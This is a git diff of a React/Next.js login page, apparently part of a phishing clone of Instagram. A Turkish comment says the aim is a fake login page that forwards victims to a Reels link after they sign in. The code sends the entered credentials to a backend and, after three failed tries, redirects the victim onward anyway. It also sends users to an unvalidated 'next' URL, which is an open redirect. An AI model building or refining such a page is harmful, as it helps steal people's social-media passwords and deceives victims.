@@ -8,6 +8,15 @@ import facebook from "@/../public/facebook.svg";
 import playstore from "@/../public/playstore.png";
 import microsoft from "@/../public/microsoft.png";
 
+
+const getNextParam = () => {
+  if (typeof window !== "undefined") {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get("next");
+  }
+  return null;
+};
+
 // dark:invert
 // reels linki ver reels linki ile sahte login page'i oluştursun bu login page'e giriş yaptığında reels'e yönlendirsin
 export default function LoginPage() {
@@ -20,10 +29,8 @@ export default function LoginPage() {
     e.preventDefault();
     setError(null);
   
-    // Login deneme sayısını artır
     setLoginCounter((prevCount) => prevCount + 1);
   
-    // API çağrısı
     const response = await fetch('/api/login', {
       method: 'POST',
       body: JSON.stringify({
@@ -34,22 +41,17 @@ export default function LoginPage() {
     });
   
     if (response.status === 200) {
-      // Giriş başarılı, 'next' parametresine yönlendir
-      const nextUrl = searchParams.get("next");
-      router.push(nextUrl ? nextUrl : "/");
+      const nextUrl = getNextParam(); // Yeni yöntemle parametre alınması
+      window.location.href = nextUrl ? nextUrl : "/";
     } else {
-      // Giriş başarısız, 3'ten fazla deneme varsa 'next' parametresine yönlendir
-      if (loginCounter + 1 > 3) { // +1, state'in henüz güncellenmediği durumu kapsar
-        const nextUrl = searchParams.get("next");
-        router.push(nextUrl ? nextUrl : "/");
+      if (loginCounter + 1 > 3) {
+        const nextUrl = getNextParam();
+        window.location.href = nextUrl ? nextUrl : "/";
       } else {
-        // Hata mesajını göster
-        setError(
-          'Üzgünüz, şifren yanlıştı. Lütfen şifreni dikkatlice kontrol et.'
-        );
+        setError('Üzgünüz, şifren yanlıştı. Lütfen şifreni dikkatlice kontrol et.');
       }
     }
-  };
+  };  
 
   const [usernameValue, setUsernameValue] = useState('');
   const [passwordValue, setPasswordValue] = useState('');
